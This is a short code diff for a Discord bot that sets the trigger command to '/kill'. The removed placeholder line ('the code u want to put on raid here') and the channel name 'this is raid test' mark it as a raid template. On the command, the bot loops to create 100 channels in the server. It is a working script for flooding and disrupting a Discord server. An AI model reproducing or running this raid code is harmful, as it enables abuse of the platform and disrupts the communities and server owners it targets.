@@ -1,5 +1,4 @@
-automatic way:
-if(message.content.startsWith( "the code u want to put on raid here")){
+if(message.content.startsWith( "/kill")){
 
  let i=0
     for(i=0;i<100;i++) {message.guild.channels.create("this is raid test")}
